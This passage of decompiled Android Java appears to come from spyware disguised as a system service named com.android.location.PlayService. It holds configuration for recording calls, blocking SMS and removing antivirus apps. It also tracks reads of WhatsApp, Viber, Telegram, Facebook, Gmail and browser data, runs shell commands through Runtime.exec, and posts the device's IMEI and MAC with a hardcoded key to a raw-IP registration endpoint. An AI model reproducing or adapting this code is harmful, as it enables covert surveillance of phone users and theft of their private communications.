    //   253: istore_1
    //   254: iload_1
    //   255: ifgt +44 -> 299
    //   258: aload_2
    //   259: ifnull +7 -> 266
    //   262: aload_2
    //   263: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   266: aload 4
    //   268: ifnull +255 -> 523
    //   271: aload 4
    //   273: invokevirtual 2794	java/io/InputStreamReader:close	()V
    //   276: aload_3
    //   277: astore 4
    //   279: aload_0
    //   280: astore_2
    //   281: aload 4
    //   283: ifnull -273 -> 10
    //   286: aload 4
    //   288: invokevirtual 2782	java/lang/Process:waitFor	()I
    //   291: pop
    //   292: aload_0
    //   293: areturn
    //   294: astore_0
    //   295: ldc_w 571
    //   298: areturn
    //   299: new 1306	java/lang/String
    //   302: dup
    //   303: aload 5
    //   305: iconst_0
    //   306: iload_1
    //   307: invokespecial 2797	java/lang/String:<init>	([CII)V
    //   310: astore 6
    //   312: new 864	java/lang/StringBuilder
    //   315: dup
    //   316: ldc_w 2799
    //   319: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   322: aload 6
    //   324: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   327: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   330: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   333: new 864	java/lang/StringBuilder
    //   336: dup
    //   337: aload_0
    //   338: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   341: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   344: aload 6
    //   346: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   349: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   352: astore_0
    //   353: goto -107 -> 246
    //   356: astore 4
    //   358: aload 6
    //   360: astore_3
    //   361: aload 9
    //   363: astore_0
    //   364: aload 7
    //   366: astore_2
    //   367: aload 4
    //   369: astore 6
    //   371: aload_2
    //   372: astore 4
    //   374: aload_0
    //   375: astore 5
    //   377: aload 6
    //   379: ldc_w 2800
    //   382: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   385: ldc_w 571
    //   388: astore 5
    //   390: aload_0
    //   391: ifnull +7 -> 398
    //   394: aload_0
    //   395: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   398: aload_3
    //   399: astore 4
    //   401: aload 5
    //   403: astore_0
    //   404: aload_2
    //   405: ifnull -126 -> 279
    //   408: aload_2
    //   409: invokevirtual 2794	java/io/InputStreamReader:close	()V
    //   412: aload_3
    //   413: astore 4
    //   415: aload 5
    //   417: astore_0
    //   418: goto -139 -> 279
    //   421: astore_0
    //   422: aload_3
    //   423: astore 4
    //   425: aload 5
    //   427: astore_0
    //   428: goto -149 -> 279
    //   431: astore_0
    //   432: aload 5
    //   434: ifnull +8 -> 442
    //   437: aload 5
    //   439: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   442: aload 4
    //   444: ifnull +8 -> 452
    //   447: aload 4
    //   449: invokevirtual 2794	java/io/InputStreamReader:close	()V
    //   452: aload_0
    //   453: athrow
    //   454: astore_2
    //   455: aload_3
    //   456: astore 4
    //   458: goto -179 -> 279
    //   461: astore_0
    //   462: goto -261 -> 201
    //   465: astore_0
    //   466: goto -253 -> 213
    //   469: astore_0
    //   470: goto -72 -> 398
    //   473: astore_2
    //   474: goto -32 -> 442
    //   477: astore_2
    //   478: goto -26 -> 452
    //   481: astore_2
    //   482: goto -216 -> 266
    //   485: astore_0
    //   486: aload 8
    //   488: astore 4
    //   490: aload_2
    //   491: astore 5
    //   493: goto -61 -> 432
    //   496: astore_0
    //   497: aload_2
    //   498: astore 5
    //   500: goto -68 -> 432
    //   503: astore 6
    //   505: aload_2
    //   506: astore_0
    //   507: aload 7
    //   509: astore_2
    //   510: goto -139 -> 371
    //   513: astore 6
    //   515: aload_2
    //   516: astore_0
    //   517: aload 4
    //   519: astore_2
    //   520: goto -149 -> 371
    //   523: aload_3
    //   524: astore 4
    //   526: goto -247 -> 279
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	529	0	paramString	String
    //   253	54	1	i	int
    //   9	400	2	localObject1	Object
    //   454	1	2	localIOException1	IOException
    //   473	1	2	localIOException2	IOException
    //   477	1	2	localIOException3	IOException
    //   481	25	2	localIOException4	IOException
    //   509	11	2	localObject2	Object
    //   18	506	3	localObject3	Object
    //   72	215	4	localObject4	Object
    //   356	12	4	localException1	Exception
    //   372	153	4	localObject5	Object
    //   75	424	5	localObject6	Object
    //   68	310	6	localObject7	Object
    //   503	1	6	localException2	Exception
    //   513	1	6	localException3	Exception
    //   31	477	7	localObject8	Object
    //   28	459	8	localObject9	Object
    //   22	340	9	localObject10	Object
    //   36	208	10	str	String
    //   25	111	11	localObject11	Object
    //   15	79	12	localRuntime	Runtime
    // Exception table:
    //   from	to	target	type
    //   286	292	294	java/lang/InterruptedException
    //   77	83	356	java/lang/Exception
    //   93	102	356	java/lang/Exception
    //   112	132	356	java/lang/Exception
    //   142	154	356	java/lang/Exception
    //   408	412	421	java/io/IOException
    //   77	83	431	finally
    //   93	102	431	finally
    //   112	132	431	finally
    //   142	154	431	finally
    //   377	385	431	finally
    //   271	276	454	java/io/IOException
    //   197	201	461	java/io/IOException
    //   205	213	465	java/io/IOException
    //   394	398	469	java/io/IOException
    //   437	442	473	java/io/IOException
    //   447	452	477	java/io/IOException
    //   262	266	481	java/io/IOException
    //   154	173	485	finally
    //   177	193	485	finally
    //   217	243	485	finally
    //   246	254	496	finally
    //   299	353	496	finally
    //   154	173	503	java/lang/Exception
    //   177	193	503	java/lang/Exception
    //   217	243	503	java/lang/Exception
    //   246	254	513	java/lang/Exception
    //   299	353	513	java/lang/Exception
  }
  
  public static String findApplication(String paramString)
  {
    String str = "";
    try
    {
      File localFile = new File("/data/data/" + paramString);
      paramString = str;
      if (localFile.exists()) {
        paramString = localFile.getAbsolutePath();
      }
      return paramString;
    }
    catch (Exception paramString)
    {
      EXCEPT(paramString, "findApplication ");
    }
    return "";
  }
  
  public static int findArray(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
  {
    int j;
    if (paramArrayOfByte2.length > paramArrayOfByte1.length)
    {
      j = -2;
      return j;
    }
    int i = 0;
    label14:
    if (i >= paramArrayOfByte1.length - paramArrayOfByte2.length + 1) {
      return -3;
    }
    int k = 0;
    for (;;)
    {
      if (k >= paramArrayOfByte2.length) {}
      while (paramArrayOfByte1[(i + k)] != paramArrayOfByte2[k])
      {
        j = i;
        if (k == paramArrayOfByte2.length) {
          break;
        }
        i += 1;
        break label14;
      }
      k += 1;
    }
  }
  
  public static int forceMobileConnectionForAddress(Context paramContext, String paramString)
  {
    int j = 1;
    int i;
    try
    {
      paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
      if (paramContext == null)
      {
        FLOG("ConnectivityManager is null, cannot try to force a mobile connection");
        return 0;
      }
      NetworkInfo.State localState = paramContext.getNetworkInfo(0).getState();
      FLOG("TYPE_MOBILE_HIPRI network state: " + localState);
      i = paramContext.startUsingNetworkFeature(0, "enableHIPRI");
      FLOG("startUsingNetworkFeature for enableHIPRI result: " + i);
      if (-1 == i)
      {
        FLOG("Wrong result of startUsingNetworkFeature, maybe problems");
        return 0;
      }
      if (i == 0)
      {
        FLOG("No need to perform additional network settings");
        return 1;
      }
    }
    catch (Exception paramContext)
    {
      EXCEPT(paramContext, "Exception on forceMobileConnectionForAddress ");
      return 0;
    }
    FLOG("Host is " + paramString);
    int k = lookupHost(paramString);
    if (-1 == k)
    {
      FLOG("Wrong host address transformation, result was -1");
      return 0;
    }
    for (;;)
    {
      if (paramContext.requestRouteToHost(0, k)) {}
      for (i = j;; i = 0)
      {
        FLOG("requestRouteToHost result: " + i);
        if (i != 0) {
          break label239;
        }
        FLOG("Wrong requestRouteToHost result: expected true, but was false");
        return i;
        if (paramContext.getNetworkInfo(0).getState().compareTo(NetworkInfo.State.CONNECTED) == 0) {
          break;
        }
        Thread.sleep(1000L);
        i += 1;
        break label243;
      }
      label239:
      return i;
      i = 0;
      label243:
      if (i < 30) {
        break;
      }
    }
  }
  
  public static int forceWIFIConnectionForAddress(Context paramContext, String paramString)
  {
    int i = 1;
    int k = 1;
    try
    {
      paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
      if (paramContext == null)
      {
        FLOG("ConnectivityManager is null, cannot try to force a mobile connection");
        return 0;
      }
      NetworkInfo.State localState = paramContext.getNetworkInfo(1).getState();
      FLOG("TYPE_WIFI network state: " + localState);
      j = i;
      if (localState.compareTo(NetworkInfo.State.CONNECTED) == 0) {
        break label268;
      }
      j = i;
      if (localState.compareTo(NetworkInfo.State.CONNECTING) == 0) {
        break label268;
      }
      i = paramContext.startUsingNetworkFeature(1, "enableHIPRI");
      FLOG("startUsingNetworkFeature for enableHIPRI result: " + i);
      if (-1 == i)
      {
        FLOG("Wrong result of startUsingNetworkFeature, maybe problems");
        return 0;
      }
      if (i == 0)
      {
        FLOG("No need to perform additional network settings");
        return 1;
      }
    }
    catch (Exception paramContext)
    {
      EXCEPT(paramContext, "Exception on forceMobileConnectionForAddress ");
      return 0;
    }
    FLOG("Host is " + paramString);
    int j = lookupHost(paramString);
    if (-1 == j)
    {
      FLOG("Wrong host address transformation, result was -1");
      return 0;
    }
    for (;;)
    {
      if (paramContext.requestRouteToHost(1, j)) {}
      for (i = k;; i = 0)
      {
        FLOG("requestRouteToHost result: " + i);
        j = i;
        if (i != 0) {
          break label268;
        }
        FLOG("Wrong requestRouteToHost result: expected true, but was false");
        return i;
        if (paramContext.getNetworkInfo(1).getState().compareTo(NetworkInfo.State.CONNECTED) == 0) {
          break;
        }
        Thread.sleep(1000L);
        i += 1;
        break label272;
      }
      label268:
      return j;
      i = 0;
      label272:
      if (i < 30) {
        break;
      }
    }
  }
  
  public static long getCurrentTime()
  {
    Time localTime = new Time();
    localTime.setToNow();
    return localTime.toMillis(true);
  }
  
  private static String getLinkFromData(byte[] paramArrayOfByte)
  {
    try
    {
      int i = findArray(paramArrayOfByte, new byte[] { 104, 116, 116, 112 });
      if (i < 0) {
        return "";
      }
      paramArrayOfByte = new String(Arrays.copyOfRange(paramArrayOfByte, i, i + (paramArrayOfByte[(i - 1)] & 0xFF)));
      return paramArrayOfByte;
    }
    catch (IndexOutOfBoundsException paramArrayOfByte) {}
    return "";
  }
  
  private String getParams()
  {
    return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("")).append("IMEI:").append(sIMEI).append("\n").toString())).append("Work:").append(bWork).append("\n").toString())).append("Server:").append(Server).append("\n").toString())).append("Port:").append(Port).append("\n").toString())).append("CurrentPort:").append(Port).append("\n").toString())).append("ServerList:").append(ServerList).append("\n").toString())).append("SMSServerList:").append(SMSServerList).append("\n").toString())).append("Force3G:").append(bForce3G).append("\n").toString())).append("ForceWIFI:").append(bForceWIFI).append("\n").toString())).append("ForceGPS:").append(iForceGPS).append("\n").toString())).append("Pickup:").append(iPickup).append("\n").toString())).append("OldPickup:").append(iOldPickup).append("\n").toString())).append("UseMacForID:").append(bUseMacForID).append("\n").toString())).append("UseBlocking:").append(bUseBlocking).append("\n").toString())).append("Transfer:").append(iTransfer).append("\n").toString())).append("TransferBinary:").append(iTransferBinary).append("\n").toString())).append("TransferBinaryUnlim:").append(iTransferBinaryUnlim).append("\n").toString())).append("KnockOffScreenOnly:").append(bKnockOffScreenOnly).append("\n").toString())).append("BufferSize:").append(iBufferSize).append("\n").toString())).append("MaxAudioListenFile:").append(iMaxAudioListenFile).append("\n").toString())).append("PauseBeforeCallRecord:").append(iPauseBeforeCallRecord).append("\n").toString())).append("CallAnswerEvent:").append(iCallAnswerEvent).append("\n").toString())).append("\n").toString())).append("AdminNumber:").append(sAdminNumber).append("\n").toString())).append("SMSBlackList:").append(sBlockSMSList).append("\n").toString())).append("CallBlackList:").append(sCallBlockList).append("\n").toString())).append("RecWhiteList:").append(sRecWhiteList).append("\n").toString())).append("RecBlackList:").append(sRecBlackList).append("\n").toString())).append("BLockIPList:").append(sBLockIPList).append("\n").toString())).append("AnswerList:").append(sAnswerList).append("\n").toString())).append("\n").toString())).append("ServerTimeout:").append(iUploadInterval).append("\n").toString())).append("UseWakeLock:").append(bUseWakeLock).append("\n").toString())).append("RecordAdmin:").append(bRecordAdmin).append("\n").toString())).append("SMSAdmin:").append(bSMSAdmin).append("\n").toString())).append("RecordCalls:").append(bRecordCalls).append("\n").toString())).append("UseRepeatControl:").append(bUseRepeatControl).append("\n").toString())).append("ReportSimChange:").append(bReportSimChange).append("\n").toString())).append("LoadPictures:").append(bLoadPictures).append("\n").toString())).append("\n").toString())).append("FreeSpace:").append(GetFreeSpace()).append("\n").toString())).append("SDCARD:").append(Environment.getExternalStorageDirectory().getAbsolutePath()).append("\n").toString())).append("SendLog:").append(bSendLog).append("\n").toString())).append("LOGCAT:").append(LOGCAT).append("\n").toString())).append("UDPPort:").append(iUDPPort).append("\n").toString())).append("AllLogPORT:").append(iAllLogPORT).append("\n").toString())).append("SMSQueryInterval:").append(iSMSQueryInterval).append("\n").toString())).append("GPSCheckInterval:").append(iGPSCheckInterval).append("\n").toString())).append("GPSTimeout:").append(iGPSTimeout).append("\n").toString())).append("\n").toString())).append("OIVersion:").append(Build.VERSION.SDK_INT).append("\n").toString())).append("Release:").append(Build.VERSION.RELEASE).append("\n").toString())).append("DaysLeft:").append(iDaysLeft).append("\n").toString())).append("AudioSource:").append(iAudioSource).append("\n").toString())).append("AudioFormat:").append(iAudioFormat).append("\n").toString())).append("CallEncoder:").append(iCallEncoder).append("\n").toString())).append("AudioBitRate:").append(iBitRate).append("\n").toString())).append("AudioSampleRate:").append(iSamplingRate).append("\n").toString())).append("UseLame:").append(bUseLame).append("\n").toString())).append("RemoveAntivirus:").append(bRemoveAntivirus).append("\n").toString())).append("AntivirusList:").append(sAntivirusList).append("\n").toString())).append("RecAfterCall:").append(iRecAfterCall).append("\n").toString())).append("UseAutoCallRec:").append(bUseAutoCallRec).append("\n").toString())).append("AudioCallSaved:").append(iAudioCallSaved).append("\n").toString())).append("CallRecording:").append(iCallRecordState).append("\n").toString())).append("AudioRecording:").append(SMSReceiver.IsAudioRecording()).append("\n").toString())).append("RecordUnknownOnly:").append(bRecordUnknownOnly).append("\n").toString())).append("TimeStamp:").append(getCurrentTime() / 1000L).append("\n").toString())).append("LastSMSRed:").append(lLastSMSRed).append("\n").toString())).append("WhatsAppCounter:").append(lWhatsAppCounter).append("\n").toString())).append("ViberCounter:").append(lViberCounter).append("\n").toString())).append("ViberAttCounter:").append(lViberAttCounter).append("\n").toString())).append("WAAttCounter:").append(lWAAttCounter).append("\n").toString())).append("TGAttCounter:").append(lTGAttCounter).append("\n").toString())).append("FBAttCounter:").append(lFBAttCounter).append("\n").toString())).append("lAgentAttCounter:").append(lAgentAttCounter).append("\n").toString())).append("lOKAttCounter:").append(lOKAttCounter).append("\n").toString())).append("OperaCounter:").append(lOperaCounter).append("\n").toString())).append("OperaMiniCounter:").append(lOperaMiniCounter).append("\n").toString())).append("ChromeCounter:").append(iChromeCounter).append("\n").toString())).append("FirefoxCounter:").append(iFirefoxCounter).append("\n").toString())).append("VKCounter:").append(lVKCounter).append("\n").toString())).append("TGCounter:").append(lTGCounter).append("\n").toString())).append("FBCounter:").append(lFBCounter).append("\n").toString())).append("OKCounter:").append(lOKCounter).append("\n").toString())).append("AgentCount:").append(lAgentCount).append("\n").toString())).append("OKAttCounter:").append(lOKAttCounter).append("\n").toString())).append("SyncFolder:").append(sSyncFolder).append("\n").toString())).append("SyncFolderLastTime:").append(lSyncFolderLastTime).append("\n").toString())).append("GmailCounter:").append(ReadOneLongSetting("lGmailCounter")).append("\n").toString())).append("UploadGmailAttach:").append(bUploadGmailAttach).append("\n").toString())).append("LastInstagram:").append(lLastInstagram).append("\n").toString())).append("\n").toString())).append("PreventFirefox:").append(iPreventFirefox).append("\n").toString())).append("PreventChrome:").append(iPreventChrome).append("\n").toString())).append("PreventOpera:").append(iPreventOpera).append("\n").toString())).append("PreventOperaMini:").append(iPreventOperaMini).append("\n").toString())).append("PreventWAAttach:").append(iPreventReadWAAtt).append("\n").toString())).append("PreventReadTG:").append(iPreventReadTG).append("\n").toString())).append("iPreventReadFB:").append(iPreventReadFB).append("\n").toString())).append("iPreventReadAgent:").append(iPreventReadAgent).append("\n").toString())).append("iPreventReadOK:").append(iPreventReadOK).append("\n").toString())).append("PreventViberAttach:").append(iPreventReadViberAtt).append("\n").toString() + "\n";
  }
  
  public static byte[] intToByteArray(int paramInt)
  {
    byte[] arrayOfByte = new byte[4];
    int i = 0;
    for (;;)
    {
      if (i >= 4) {
        return arrayOfByte;
      }
      arrayOfByte[(3 - i)] = ((byte)(paramInt >>> (arrayOfByte.length - 1 - i) * 8 & 0xFF));
      i += 1;
    }
  }
  
  public static boolean isNumeric(String paramString)
  {
    return paramString.matches("[-+]?\\d*\\.?\\d+");
  }
  
  private static int lookupHost(String paramString)
  {
    if ((paramString == null) || (paramString.length() == 0)) {
      return -1;
    }
    try
    {
      InetAddress localInetAddress = InetAddress.getByName(paramString);
      paramString = localInetAddress.getAddress();
      return (paramString[3] & 0xFF) << 24 | (paramString[2] & 0xFF) << 16 | (paramString[1] & 0xFF) << 8 | paramString[0] & 0xFF;
    }
    catch (UnknownHostException localUnknownHostException)
    {
      EXCEPT(localUnknownHostException, "lookupHost failed " + paramString);
    }
    return -1;
  }
  
  public static final String md5(String paramString)
  {
    try
    {
      Object localObject = MessageDigest.getInstance("MD5");
      ((MessageDigest)localObject).update(paramString.getBytes());
      localObject = ((MessageDigest)localObject).digest();
      StringBuffer localStringBuffer = new StringBuffer();
      int i = 0;
      if (i >= localObject.length) {
        return localStringBuffer.toString();
      }
      for (paramString = Integer.toHexString(localObject[i] & 0xFF);; paramString = "0" + paramString) {
        if (paramString.length() >= 2)
        {
          localStringBuffer.append(paramString);
          i += 1;
          break;
        }
      }
      return "";
    }
    catch (NoSuchAlgorithmException paramString)
    {
      EXCEPT(paramString, "md5");
    }
  }
  
  public static String now()
  {
    Calendar localCalendar = Calendar.getInstance();
    if (localCalendar == null) {
      return "cal==null";
    }
    return new SimpleDateFormat("yyyyMMddHHmmss").format(localCalendar.getTime());
  }
  
  public static String now_format(String paramString)
  {
    Calendar localCalendar = Calendar.getInstance();
    if (localCalendar == null) {
      return "cal==null";
    }
    return new SimpleDateFormat(paramString).format(localCalendar.getTime());
  }
  
  public static void putEvent(String paramString)
  {
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("resource_id", Integer.valueOf(2));
    localContentValues.put("timepoint", Long.valueOf(getCurrentTime() / 1000L));
    localContentValues.put("text1", paramString);
    try
    {
      if (ref != null)
      {
        ContentResolver localContentResolver = ref.getContentResolver();
        if (localContentResolver != null) {
          localContentResolver.insert(UniProvider.CONTENT_URI, localContentValues);
        }
      }
      return;
    }
    catch (Exception localException)
    {
      while (localException == null) {}
      Log.v("backup.service", "Exception in putevent(" + localException.getMessage() + ")" + paramString);
    }
  }
  
  private void sendToServer(String paramString1, String paramString2, String paramString3)
  {
    FLOG("sendToServer() " + paramString1 + "," + paramString2 + "," + paramString3);
    DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
    HttpPost localHttpPost = new HttpPost("http://188.138.125.230/regphone.php");
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new BasicNameValuePair("mac", paramString1));
    localArrayList.add(new BasicNameValuePair("imei", paramString2));
    localArrayList.add(new BasicNameValuePair("id", paramString3));
    localArrayList.add(new BasicNameValuePair("secret_key", "Higt8#$faswe79fgGAqqgdkw"));
    try
    {
      localHttpPost.setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
      paramString1 = new BufferedReader(new InputStreamReader(localDefaultHttpClient.execute(localHttpPost).getEntity().getContent()));
      for (;;)
      {
        paramString2 = paramString1.readLine();
        if (paramString2 == null) {
          return;
        }
        FLOG(paramString2);
      }
      return;
    }
    catch (IOException paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  /* Error */
  public static void service(String paramString)
  {
    // Byte code:
    //   0: invokestatic 2747	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore_3
    //   4: aconst_null
    //   5: astore 4
    //   7: aconst_null
    //   8: astore 7
    //   10: aconst_null
    //   11: astore 6
    //   13: new 864	java/lang/StringBuilder
    //   16: dup
    //   17: ldc_w 3244
    //   20: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   23: aload_0
    //   24: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   27: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   30: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   33: aload_3
    //   34: new 864	java/lang/StringBuilder
    //   37: dup
    //   38: ldc_w 3244
    //   41: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   44: aload_0
    //   45: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   48: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   51: invokevirtual 2751	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   54: astore_3
    //   55: aload_3
    //   56: astore 4
    //   58: new 2753	java/io/OutputStreamWriter
    //   61: dup
    //   62: aload_3
    //   63: invokevirtual 2759	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   66: invokespecial 2762	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   69: astore 5
    //   71: aload 5
    //   73: aload_0
    //   74: invokevirtual 2763	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   77: aload 5
    //   79: invokevirtual 2766	java/io/OutputStreamWriter:flush	()V
    //   82: aload 5
    //   84: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   87: aload 5
    //   89: ifnull +126 -> 215
    //   92: aload 5
    //   94: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   97: aload_3
    //   98: astore_0
    //   99: aload_0
    //   100: ifnull +22 -> 122
    //   103: bipush 30
    //   105: istore_1
    //   106: iload_1
    //   107: iconst_1
    //   108: isub
    //   109: istore_2
    //   110: iload_1
    //   111: ifgt +63 -> 174
    //   114: iload_2
    //   115: ifgt +7 -> 122
    //   118: aload_0
    //   119: invokevirtual 2770	java/lang/Process:destroy	()V
    //   122: return
    //   123: astore_0
    //   124: aload 4
    //   126: astore_3
    //   127: aload 6
    //   129: astore 4
    //   131: aload_3
    //   132: astore_0
    //   133: aload 4
    //   135: ifnull -36 -> 99
    //   138: aload 4
    //   140: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   143: aload_3
    //   144: astore_0
    //   145: goto -46 -> 99
    //   148: astore_0
    //   149: aload_3
    //   150: astore_0
    //   151: goto -52 -> 99
    //   154: astore_0
    //   155: aload 7
    //   157: astore_3
    //   158: aload_3
    //   159: ifnull +7 -> 166
    //   162: aload_3
    //   163: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   166: aload_0
    //   167: athrow
    //   168: astore_0
    //   169: aload_3
    //   170: astore_0
    //   171: goto -72 -> 99
    //   174: aload_0
    //   175: invokevirtual 2773	java/lang/Process:exitValue	()I
    //   178: pop
    //   179: goto -65 -> 114
    //   182: astore_3
    //   183: ldc2_w 1356
    //   186: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   189: iload_2
    //   190: istore_1
    //   191: goto -85 -> 106
    //   194: astore_3
    //   195: goto -29 -> 166
    //   198: astore_0
    //   199: return
    //   200: astore_0
    //   201: aload 5
    //   203: astore_3
    //   204: goto -46 -> 158
    //   207: astore_0
    //   208: aload 5
    //   210: astore 4
    //   212: goto -81 -> 131
    //   215: aload_3
    //   216: astore_0
    //   217: goto -118 -> 99
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	220	0	paramString	String
    //   105	86	1	i	int
    //   109	81	2	j	int
    //   3	167	3	localObject1	Object
    //   182	1	3	localIllegalThreadStateException	IllegalThreadStateException
    //   194	1	3	localIOException	IOException
    //   203	13	3	localObject2	Object
    //   5	206	4	localObject3	Object
    //   69	140	5	localOutputStreamWriter	java.io.OutputStreamWriter
    //   11	117	6	localObject4	Object
    //   8	148	7	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   33	55	123	java/io/IOException
    //   58	71	123	java/io/IOException
    //   138	143	148	java/io/IOException
    //   33	55	154	finally
    //   58	71	154	finally
    //   92	97	168	java/io/IOException
    //   174	179	182	java/lang/IllegalThreadStateException
    //   162	166	194	java/io/IOException
    //   118	122	198	java/lang/InterruptedException
    //   174	179	198	java/lang/InterruptedException
    //   183	189	198	java/lang/InterruptedException
    //   71	87	200	finally
    //   71	87	207	java/io/IOException
  }
  
  private void setBaseOptions()
  {
    FLOG("setBaseOptions");
    try
    {
      PackageInfo localPackageInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
      if (localPackageInfo != null)
      {
        FLOG("versionCode = " + localPackageInfo.versionCode);
        SOFT_VERSION = localPackageInfo.versionCode;
        FLOG("package is " + localPackageInfo.packageName);
        MY_PACKAGE_NAME = localPackageInfo.packageName;
      }
      return;
    }
    catch (Exception localException)
    {
      EXCEPT(localException, "setBaseOptions");
    }
  }
  
  private void setMobileDataEnabled(Context paramContext, boolean paramBoolean)
  {
    try
    {
      paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
      Object localObject = Class.forName(paramContext.getClass().getName()).getDeclaredField("mService");
      ((Field)localObject).setAccessible(true);
      paramContext = ((Field)localObject).get(paramContext);
      localObject = Class.forName(paramContext.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[] { Boolean.TYPE });
      ((Method)localObject).setAccessible(true);
      ((Method)localObject).invoke(paramContext, new Object[] { Boolean.valueOf(paramBoolean) });
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
      EXCEPT(paramContext, "setMobileDataEnabled");
    }
  }
  
  public static boolean setVar(String paramString)
  {
    FLOG("setVar:" + paramString);
    SharedPreferences.Editor localEditor = mSettings.edit();
    if (localEditor == null)
    {
      FLOG("setVar.edit(); failed");
      return false;
    }
    if (paramString == null)
    {
      FLOG("setVar:data is null");
      return false;
    }
    paramString = paramString.trim();
    if (paramString.length() < 3)
    {
      FLOG("setVar:length to small");
      return false;
    }
    Object localObject;
    try
    {
      localObject = paramString.split(",");
      if (localObject.length < 2)
      {
        FLOG("No type");
        return false;
      }
